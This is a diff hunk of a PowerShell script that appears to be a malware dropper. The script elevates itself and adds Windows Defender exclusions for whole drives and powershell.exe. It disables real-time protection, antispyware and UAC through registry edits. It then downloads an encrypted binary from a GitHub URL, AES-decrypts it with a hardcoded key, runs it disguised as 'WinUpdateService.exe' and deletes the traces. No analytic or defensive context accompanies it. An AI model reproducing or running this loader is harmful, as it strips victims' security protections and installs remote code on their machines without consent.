@@ -20,84 +20,82 @@ $randomPath = Get-Random -InputObject $paths
 $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
 
-$scriptContent = @"
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
     Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"' -Verb RunAs
     exit
 }
 
-Add-MpPreference -ExclusionPath `"$env:SystemDrive\`"
-Add-MpPreference -ExclusionPath `"C:\`"
-Add-MpPreference -ExclusionPath `"$env:TEMP`"
-Add-MpPreference -ExclusionPath `"$env:APPDATA`"
-Add-MpPreference -ExclusionPath `"$env:SystemDrive\programdata\Windata`"
-Add-MpPreference -ExclusionProcess `"powershell.exe`"
-Add-MpPreference -ExclusionPath `"C:\ProgramData\GG-Win`"
+Add-MpPreference -ExclusionPath "$env:SystemDrive\"
+Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "$env:TEMP"
+Add-MpPreference -ExclusionPath "$env:APPDATA"
+Add-MpPreference -ExclusionPath "$env:SystemDrive\programdata\Windata"
+Add-MpPreference -ExclusionProcess "powershell.exe"
+Add-MpPreference -ExclusionPath "C:\ProgramData\GG-Win"
 
-reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications`" /v ToastEnabled /t REG_DWORD /d 0 /f
-reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications`" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
-reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge`" /v Enabled /t REG_DWORD /d 0 /f
-reg add `"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter`" /v Enabled /t REG_DWORD /d 0 /f
-reg add `"HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer`" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
-reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection`" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features`" /v TamperProtection /t REG_DWORD /d 1 /f
-reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
-reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`" /v TamperProtection /t REG_DWORD /d 1 /f
-reg add `"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender`" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v LockScreenToastEnabled /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\MSEdge" /v Enabled /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter" /v Enabled /t REG_DWORD /d 0 /f
+reg add "HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v TamperProtection /t REG_DWORD /d 1 /f
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 cls
 
-function HexStringToByteArray([string]`$hex) {
-    `$bytes = New-Object byte[] (`$hex.Length / 2)
-    for (`$i = 0; `$i -lt `$bytes.Length; `$i++) {
-        `$bytes[`$i] = [Convert]::ToByte(`$hex.Substring(`$i * 2, 2), 16)
+function HexStringToByteArray([string]$hex) {
+    $bytes = New-Object byte[] ($hex.Length / 2)
+    for ($i = 0; $i -lt $bytes.Length; $i++) {
+        $bytes[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16)
     }
-    return `$bytes
+    return $bytes
 }
 function AES-Decrypt {
     param (
-        [byte[]]`$Data,
-        [byte[]]`$Key,
-        [byte[]]`$IV
+        [byte[]]$Data,
+        [byte[]]$Key,
+        [byte[]]$IV
     )
     try {
-        `$aes = [System.Security.Cryptography.Aes]::Create()
-        `$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-        `$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
-        `$aes.Key = `$Key
-        `$aes.IV = `$IV
-        `$decryptor = `$aes.CreateDecryptor()
-        `$ms = New-Object System.IO.MemoryStream
-        `$cs = New-Object System.Security.Cryptography.CryptoStream(`$ms, `$decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
-        `$cs.Write(`$Data, 0, `$Data.Length)
-        `$cs.FlushFinalBlock()
-        `$cs.Close()
-        `$ms.Close()
-        return `$ms.ToArray()
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aes.Key = $Key
+        $aes.IV = $IV
+        $decryptor = $aes.CreateDecryptor()
+        $ms = New-Object System.IO.MemoryStream
+        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+        $cs.Write($Data, 0, $Data.Length)
+        $cs.FlushFinalBlock()
+        $cs.Close()
+        $ms.Close()
+        return $ms.ToArray()
     }
     catch {
-        return `$null
+        return $null
     }
 }
-`$tempPath = "`$env:TEMP\enc_payload.bin"
-Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile `$tempPath
-`$encBytes = [System.IO.File]::ReadAllBytes(`$tempPath)
-`$keyHex = "00112233445566778899aabbccddeeff"
-`$ivHex = "0102030405060708090a0b0c0d0e0f10"
-`$key = HexStringToByteArray `$keyHex
-`$iv = HexStringToByteArray `$ivHex
-`$decBytes = AES-Decrypt -Data `$encBytes -Key `$key -IV `$iv
-if (`$decBytes -ne `$null) {
-    `$outPath = Join-Path -Path "$fullPath" -ChildPath "WinUpdateService.exe"
-    [System.IO.File]::WriteAllBytes(`$outPath, `$decBytes)
-    if (Test-Path `$outPath) {
-        Start-Process `$outPath
+$tempPath = "$env:TEMP\enc_payload.bin"
+Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile $tempPath
+$encBytes = [System.IO.File]::ReadAllBytes($tempPath)
+$keyHex = "00112233445566778899aabbccddeeff"
+$ivHex = "0102030405060708090a0b0c0d0e0f10"
+$key = HexStringToByteArray $keyHex
+$iv = HexStringToByteArray $ivHex
+$decBytes = AES-Decrypt -Data $encBytes -Key $key -IV $iv
+if ($decBytes -ne $null) {
+    $outPath = Join-Path -Path $fullPath -ChildPath "WinUpdateService.exe"
+    [System.IO.File]::WriteAllBytes($outPath, $decBytes)
+    if (Test-Path $outPath) {
+        Start-Process $outPath
         Start-Sleep -Seconds 5
-        Remove-Item `$outPath -Force
+        Remove-Item $outPath -Force
     }
 }
-Remove-Item `$tempPath -Force
-"@
+Remove-Item $tempPath -Force
 
 Set-Content -Path (Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1") -Value $scriptContent -Force
 
